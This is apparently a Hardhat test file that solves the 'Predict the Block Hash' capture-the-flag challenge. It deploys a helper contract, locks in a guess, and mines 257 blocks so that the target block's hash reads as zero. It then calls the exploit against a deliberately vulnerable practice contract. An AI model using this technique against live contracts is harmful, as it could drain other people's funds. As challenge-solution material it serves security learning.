const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("PredictTheBlockHashChallenge", async function () {
    let contract;

    before(async function () {
        contract = await (await ethers.getContractFactory("PredictTheBlockHashChallenge")).deploy({ value: ethers.utils.parseEther("1") });
    });

    it("Exploit", async function () {
        // WRITE YOUR CODE HERE
        helper = await (await ethers.getContractFactory("PredictTheBlockHashHelper")).deploy();
        await helper.lockInGuess(contract.address, { value: ethers.utils.parseEther("1") });
        for (let _ = 0; _ < 256 + 1; _++)
            await ethers.provider.send("evm_mine");

        await helper.exploit(contract.address);
    });

    after(async function () {
        expect(await contract.isComplete()).to.be.true;
    });
});